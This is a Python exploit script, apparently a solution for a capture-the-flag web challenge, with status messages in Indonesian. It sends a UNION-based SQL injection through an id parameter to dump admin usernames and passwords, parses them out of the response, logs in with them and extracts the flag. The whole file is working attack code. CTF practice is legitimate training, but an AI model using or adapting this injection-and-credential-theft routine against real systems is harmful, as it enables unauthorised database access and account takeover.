#!/usr/bin/env python3

import re
import sys

import requests


BASE = "http://chal-b12648b1.ctf.thcon.party"


def main() -> int:
    s = requests.Session()

    s.get(
        f"{BASE}/",
        params={"id": "-1 UNION SELECT username,password FROM adminDBtable--"},
        timeout=15,
    )
    dumped = s.get(f"{BASE}/view-result", timeout=15).text

    creds = re.search(r"<tr><td>([^<]+)</td><td>([^<]+)</td></tr>", dumped)
    if not creds:
        print("gagal dump kredensial")
        return 1

    username, password = creds.groups()
    print(f"[+] username = {username}")
    print(f"[+] password = {password}")

    s.post(
        f"{BASE}/login",
        data={"username": username, "password": password},
        timeout=15,
        allow_redirects=True,
    )
    dashboard = s.get(f"{BASE}/dashboard", timeout=15).text

    flag = re.search(r"THC\{[^}]+\}", dashboard)
    if not flag:
        print("flag tidak ditemukan")
        return 1

    print(flag.group(0))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
